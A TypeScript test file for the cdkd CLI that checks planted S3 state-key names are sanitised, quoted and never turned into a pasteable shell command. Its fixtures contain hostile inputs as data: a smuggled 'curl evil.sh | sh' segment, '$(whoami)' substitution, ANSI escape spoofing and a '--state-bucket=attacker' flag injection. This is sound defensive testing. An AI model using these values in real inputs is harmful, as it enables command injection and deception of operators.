/**
 * Issue go-to-k/cdkd#3179 section C: `describeStateKey` built its
 * `stack (region)` answer out of RAW S3 key segments, and every reader put that
 * answer in front of an operator deciding whether to destroy something.
 *
 * A state-bucket key is not cdkd's to trust — anyone holding `s3:PutObject` on
 * the bucket chooses it, the same premise go-to-k/cdkd#3207 rests on for the
 * record BODY.
 *
 * Section C named two readers (`gc.ts`'s abort list, `bootstrap-destroy.ts`'s
 * refusal list). Measuring found a THIRD and worse one: `gc.ts` re-parsed the
 * rendered string to build a `cdkd state show ...` command it tells the
 * operator to RUN. That reader is what `isPasteableIdent` exists for, and its
 * cases are the ones below that assert on a command rather than on a line.
 */
import { describe, expect, it } from 'vite-plus/test';

import {
  DEFAULT_STATE_PREFIX,
  LOCK_FILE_SUFFIX,
  STATE_FILE_SUFFIX,
  describeStateKey,
  isPasteableIdent,
  parseStateKey,
} from '../../../src/cli/commands/state-file-keys.js';

const ESC = String.fromCharCode(27);
const CR = String.fromCharCode(13);

/** What `gc.ts` builds from the parts — kept in step with that site by hand. */
function inspectHint(key: string): string {
  const { stack, region } = parseStateKey(key, STATE_FILE_SUFFIX, DEFAULT_STATE_PREFIX);
  const pasteable = isPasteableIdent(stack) && (region === undefined || isPasteableIdent(region));
  if (!pasteable) return '<no command offered>';
  return region === undefined
    ? `cdkd state show ${stack}`
    : `cdkd state show ${stack} --stack-region ${region}`;
}

describe('describeStateKey renders a planted key with a visible boundary (#3179 C)', () => {
  // Each case is a MEASURED pre-fix rendering, not an invented one: the
  // `before` column is what this tree produced before the change.
  const PLANTED: Array<{ label: string; key: string; before: string }> = [
    {
      label: 'ANSI erase + carriage return',
      key: `cdkd/Prod${ESC}[2K${CR}SafeStack/us-east-1/state.json`,
      before: `Prod${ESC}[2K${CR}SafeStack (us-east-1)`,
    },
    {
      label: 'shell metacharacters',
      key: 'cdkd/A;curl+evil.sh|sh/us-east-1/state.json',
      before: 'A;curl+evil.sh|sh (us-east-1)',
    },
    {
      label: 'command substitution',
      key: 'cdkd/$(whoami)/us-east-1/state.json',
      before: '$(whoami) (us-east-1)',
    },
  ];

  for (const { label, key, before } of PLANTED) {
    it(`${label}: no longer renders as itself`, () => {
      const rendered = describeStateKey(key, STATE_FILE_SUFFIX, DEFAULT_STATE_PREFIX);
      expect(rendered, 'the planted segment reached the terminal unaltered').not.toBe(before);
      // The specific property, not just "different": nothing outside printable
      // ASCII survives, so no escape sequence can rewrite the line.
      expect(rendered).toMatch(/^[ -~]*$/);
    });
  }

  it('a legitimate name and region still render byte-identically', () => {
    // The half that makes the boundary adoptable: every ordinary row must look
    // exactly as it did, or the guard is paid for on every line.
    expect(
      describeStateKey('cdkd/MyStack/us-east-1/state.json', STATE_FILE_SUFFIX, DEFAULT_STATE_PREFIX)
    ).toBe('MyStack (us-east-1)');
    expect(
      describeStateKey('cdkd/Parent~Child/us-east-1/state.json', STATE_FILE_SUFFIX, DEFAULT_STATE_PREFIX)
    ).toBe('Parent~Child (us-east-1)');
    // Legacy region-less layout, and the lock suffix, both still answered.
    expect(
      describeStateKey('cdkd/MyStack/state.json', STATE_FILE_SUFFIX, DEFAULT_STATE_PREFIX)
    ).toBe('MyStack');
    expect(
      describeStateKey('cdkd/MyStack/us-east-1/lock.json', LOCK_FILE_SUFFIX, DEFAULT_STATE_PREFIX)
    ).toBe('MyStack (us-east-1)');
  });
});

describe('the pasteable-command reader (#3179 C, the third reader)', () => {
  it('refuses to build a command from a name carrying shell metacharacters', () => {
    expect(inspectHint('cdkd/A;curl+evil.sh|sh/us-east-1/state.json')).toBe('<no command offered>');
    expect(inspectHint('cdkd/$(whoami)/us-east-1/state.json')).toBe('<no command offered>');
  });

  it('refuses a name that is a FLAG, which sanitising alone does not catch', () => {
    // The case this helper exists for. Every character of it is a plain
    // identifier character, so it renders BARE and a quote-only fix would still
    // have pasted an option into the stack-name position, pointing the
    // operator's inspection at another bucket.
    const key = 'cdkd/--state-bucket=attacker/us-east-1/state.json';
    expect(
      describeStateKey(key, STATE_FILE_SUFFIX, DEFAULT_STATE_PREFIX),
      'precondition: this value is exactly the one sanitising leaves alone'
    ).toBe('--state-bucket=attacker (us-east-1)');
    expect(inspectHint(key)).toBe('<no command offered>');
  });

  it('the region conjunct is defence in depth, and is recorded as such', () => {
    // Stated precisely rather than dressed up as the injection point, which an
    // earlier revision of this case did. `REGION_SEGMENT` already constrains a
    // parsed region to `/^(?:[a-z]{2}|eusc)(-[a-z]+)+-\d+$/`, so a region that
    // REACHED the command is pasteable by construction and the conjunct can
    // never be the thing that fires. It stays because `parseStateKey` is
    // exported and a future caller need not have come through that pattern.
    expect(isPasteableIdent('--x')).toBe(false);
    expect(isPasteableIdent('us-east-1')).toBe(true);
  });

  it('a spoofing value comes back QUOTED, not merely stripped', () => {
    // The BOUNDARY, which is a different property from sanitising and the one
    // section A of the issue is about. Without this, swapping `displayIdent`
    // for `displaySafe(x, { asciiOnly: true })` — the sanitised-but-unbounded
    // state — keeps every other case in this file green: the rendering still
    // differs from the planted text and still matches `/^[ -~]*$/`.
    expect(
      describeStateKey(
        `cdkd/Prod${ESC}[2K${CR}Safe/us-east-1/state.json`,
        STATE_FILE_SUFFIX,
        DEFAULT_STATE_PREFIX
      )
    ).toBe('"Prod [2K Safe" (us-east-1)');
  });

  it('still offers the command for an ordinary key, in both layouts', () => {
    expect(inspectHint('cdkd/MyStack/us-east-1/state.json')).toBe(
      'cdkd state show MyStack --stack-region us-east-1'
    );
    expect(inspectHint('cdkd/MyStack/state.json')).toBe('cdkd state show MyStack');
  });

  it('an OVER-CAP name is refused — the half the regex cannot answer', () => {
    // The `displayIdent` round-trip conjunct is reachable ONLY here. Every
    // string matching `PASTEABLE_STATE_IDENT` is already printable ASCII inside
    // the plain-identifier set, so sanitising is the identity on it and the
    // conjunct can fire only on LENGTH. Without this case, replacing that
    // conjunct with `true` keeps the whole suite green — the same shape as the
    // `const pasteable = true` gap a review round found one level up.
    // 2000 is comfortably past `STACK_REF_MAX_CODE_POINTS` (1152), which is the
    // cap `isPasteableIdent` asks `displayIdent` for. The precondition is
    // stated through the PUBLIC surface rather than by re-spelling the regex
    // here — a second copy of a security predicate is how the two drift.
    const overCap = 'A'.repeat(2000);
    expect(isPasteableIdent('A'.repeat(64)), 'precondition: this shape is accepted').toBe(true);
    expect(isPasteableIdent(overCap)).toBe(false);
  });

  it('isPasteableIdent accepts the legitimate shapes and rejects the rest', () => {
    for (const ok of ['MyStack', 'Parent~Child', 'us-east-1', 'a.b_c-d', 'A1']) {
      expect(isPasteableIdent(ok), `${ok} should be pasteable`).toBe(true);
    }
    // The shell-expansion set, MEASURED in bash on a real host rather than
    // reasoned about: `~root` -> /var/root, `~/x` -> $HOME/x, `~-` -> $OLDPWD,
    // `a=~/x` -> a=$HOME/x. A medial `~` is inert, which is why `Parent~Child`
    // is in the accepted list above — tilde expansion is positional.
    for (const bad of [
      '',
      '-x',
      '--flag',
      '~root',
      '~/x',
      '~-',
      'a=~/x',
      'a=b',
      'a b',
      'a;b',
      'a$b',
      `a${ESC}b`,
      'a"b',
      "a'b",
    ]) {
      expect(isPasteableIdent(bad), `${JSON.stringify(bad)} should NOT be pasteable`).toBe(false);
    }
  });
});

describe('parseStateKey keeps the split the heuristic already made (#3179 C)', () => {
  it('returns the parts rather than a string a caller has to re-parse', () => {
    expect(parseStateKey('cdkd/MyStack/us-east-1/state.json', STATE_FILE_SUFFIX, DEFAULT_STATE_PREFIX)).toEqual({
      stack: 'MyStack',
      region: 'us-east-1',
    });
    expect(parseStateKey('cdkd/MyStack/state.json', STATE_FILE_SUFFIX, DEFAULT_STATE_PREFIX)).toEqual({
      stack: 'MyStack',
    });
  });

  it('parts are RAW — the sanitising belongs to the renderer, not the split', () => {
    // Stated as a test because a caller reading `parseStateKey` must not assume
    // the value is safe to print; `gc.ts` passes it through `isPasteableIdent`
    // precisely because it is not.
    const { stack } = parseStateKey(
      `cdkd/Prod${ESC}[2K/us-east-1/state.json`,
      STATE_FILE_SUFFIX,
      DEFAULT_STATE_PREFIX
    );
    expect(stack).toBe(`Prod${ESC}[2K`);
  });

  it('the nested-prefix legacy case the heuristic deliberately keeps still works', () => {
    // `--state-prefix cdkd/team-a` nests inside the default prefix, so this is
    // a LEGACY key two segments deep and must not split as `team-a (MyStack)`.
    expect(
      parseStateKey('cdkd/team-a/MyStack/state.json', STATE_FILE_SUFFIX, DEFAULT_STATE_PREFIX)
    ).toEqual({ stack: 'MyStack' });
  });
});
